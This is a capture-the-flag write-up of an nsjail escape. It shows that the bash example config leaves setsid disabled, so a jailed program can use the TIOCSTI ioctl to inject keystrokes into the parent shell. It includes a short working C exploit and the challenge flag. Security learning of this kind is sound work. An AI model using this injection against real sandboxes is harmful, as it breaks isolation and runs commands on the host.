# Example Jail (misc)
The challenge is a nsjail escape on the default configuration used in the bash example. The server will run a given binary simulating an actual tty shell.

The server builds the most recent release nsjail from git and runs the following commands to set up the config file:
```dockerfile
RUN cd nsjail && make && mv ./nsjail /bin && mv configs/bash-with-fake-geteuid.cfg /nsjail.cfg && cd .. && rm -rf nsjail
RUN sed -i 's/"\/bin\/bash"/"\/solve"/' /nsjail.cfg
```

On the server, there is a runner that loads the solver's program and executes the following to run the binary:
```py
p = subprocess.Popen(["socat", "-", "exec:\"bash -i\",pty,stderr,setsid,sigint,sane"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) # spawns bash in a PTY
p.stdin.write(b"nsjail --config /nsjail.cfg &\n") # runs nsjail process in background of bash

time.sleep(5)

print(p.communicate(timeout=3)[0].decode()) # and prints the output

```

The escape is due to the fact that the example has `setsid: false`. This means you can use the TIOCSTI ioctl to send characters to the parent shell outside of the nsjail! The setup in the challenge makes this exploitable by running the command with `&`. The escape may still be possible otherwise using control signals and buffering, but I did not attempt to get it working.

```c
#include <sys/ioctl.h>
#include <string.h>

int main() {
    const char* c = "cat /flag\n";
    for(unsigned int i = 0; i < strlen(c); i++) {
        ioctl(0, TIOCSTI, &c[i]); // writes char to PTY which is read by bash
    }
    return 0;
}

```

This challenge was pretty hard to set up. It's nsjail inside bash inside socat inside nsjail...

```
irisctf{ioctl_is_forever}
```
